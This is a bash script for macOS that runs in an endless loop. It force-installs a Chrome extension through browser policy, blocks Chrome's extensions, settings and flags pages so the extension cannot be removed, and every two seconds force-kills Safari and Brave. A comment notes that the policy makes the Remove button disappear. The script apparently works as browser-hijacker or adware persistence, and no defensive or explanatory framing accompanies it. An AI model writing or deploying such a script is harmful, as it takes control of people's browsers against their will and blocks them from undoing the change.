#!/bin/bash
while true; do
  # Force install Web Store Extension (this makes the Remove button disappear!)
  defaults write com.google.Chrome ExtensionInstallForcelist -array "elhfcfelcnpeeelpbbcjbbajnfhakjcj;https://clients2.google.com/service/update2/crx"
  
  # Block extensions and settings pages
  defaults write com.google.Chrome URLBlocklist -array \
    "chrome://extensions" "chrome://extensions/*" \
    "chrome://settings" "chrome://settings/*" \
    "chrome://flags" "chrome://flags/*"

  # Kill alternative browsers
  if pgrep -x "Safari" > /dev/null; then killall -9 "Safari" > /dev/null 2>&1; fi
  if pgrep -x "Brave Browser" > /dev/null; then killall -9 "Brave Browser" > /dev/null 2>&1; fi
  sleep 2
done
